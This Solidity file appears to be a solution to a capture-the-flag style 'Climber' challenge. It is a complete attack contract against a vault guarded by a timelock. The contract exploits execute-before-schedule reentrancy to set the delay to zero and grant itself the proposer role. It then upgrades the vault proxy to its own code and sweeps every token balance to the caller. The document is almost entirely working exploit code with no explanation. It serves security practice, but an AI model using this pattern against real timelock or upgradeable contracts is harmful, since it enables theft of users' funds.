// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract AttackClimber {
    ClimberVault private immutable climberVault;
    ClimberTimelock private immutable climberTimelock;

    constructor(address _vault) {
        climberVault = ClimberVault(_vault);
        climberTimelock = ClimberTimelock(payable(climberVault.owner()));
    }

    receive() external payable {}

    fallback() external payable {
        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(this);
        targets[3] = address(climberVault);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("");
        dataElements[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));
        climberTimelock.schedule(targets, values, dataElements, 0);
    }

    function attack() external {
        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(this);
        targets[3] = address(climberVault);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("");
        dataElements[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));
        climberTimelock.execute(targets, values, dataElements, 0);
    }

    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function proxiableUUID() external view returns (bytes32) {
        return (0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
    }
}
